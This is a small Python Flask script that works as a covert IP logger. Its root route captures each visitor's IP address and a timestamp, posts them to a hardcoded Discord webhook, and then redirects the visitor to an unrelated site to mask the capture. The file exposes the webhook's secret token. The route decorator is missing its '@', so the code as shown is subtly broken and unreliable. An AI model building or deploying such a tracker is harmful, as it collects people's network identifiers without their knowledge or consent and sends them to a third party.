from flask import Flask, request, redirect
from datetime import datetime
import requests


app = Flask(__name__)

def send_ip(ip, date):
    webhook_url = "https://discord.com/api/webhooks/1545397491594301472/SlkPd0RXYePOhCGXR9GlCLFUrv1nA7jAJ7X4qXPOMVdORTj9O0Pr6NKCva6ndJfg0oGi"  
    data = {
        "content" : "",
        "title" : "Logged"
    }
    data["embeds"] = [
        {
            "title":  ip,
            "description":  date
        }
    ]
    requests.post(webhook_url, json=data)

app.route("/")
def index():
    ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")

    send_ip(ip, date)  # Send the IP and date to the Discord webhook

    return redirect("https://ywpoq.netlify.app/")

if __name__ == "__main__":
    app.run(host='0.0.0.0')
 